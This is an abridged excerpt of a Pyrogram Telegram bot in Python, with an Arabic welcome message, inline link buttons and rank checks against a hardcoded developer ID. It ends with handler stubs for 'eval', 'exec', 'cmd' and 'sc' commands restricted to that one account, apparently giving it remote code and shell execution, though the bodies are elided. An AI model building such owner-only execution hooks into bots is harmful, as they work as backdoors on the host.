...
async def open_hms(c: Client, m: Message):
   ...
   if not wsdb.get(f"hms-{id}"):
      ...
      # التحقق من الصلاحية
      if m.from_user.id != to and m.from_user.id != sender and m.from_user.id != 7480642174:
         try:
...
def private_func(c,m,k):
  ...
  if text == '/start':
    ...
    message_text = f'''
    اهلاً وسهلاً بك في بوت كارس {name}! 🌟
...
4. ارسل الاوامر في المجمـوعـة لمعرفة الاوامر
    ...
    reply_markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton('Mohammed محمد', url='https://t.me/L_k505'),
            InlineKeyboardButton('Source', url='https://t.me/k_q505')
        ],
        [
...
- في حال انك بالتوب واسمك مزخرف راح يصفيه البوت تلقائي''',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (f"Channel Source", url=f't.me/{channel}')]]))
  ...
  if text == '/start' and dev_pls(m.from_user.id,m.chat.id):
     ...
     if m.from_user.id == 7480642174 or m.from_user.id == 7480642174:
       rank = 'المطور محمد'
     else:
...
@Client.on_message(filters.command("eval") & filters.user(7480642174))
...
@Client.on_message(filters.command("exec") & filters.user(7480642174))
...
@Client.on_message(filters.command("cmd") & filters.user(7480642174))
...
@Client.on_message(filters.command("print") & filters.user(7480642174))
...
@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(7480642174))
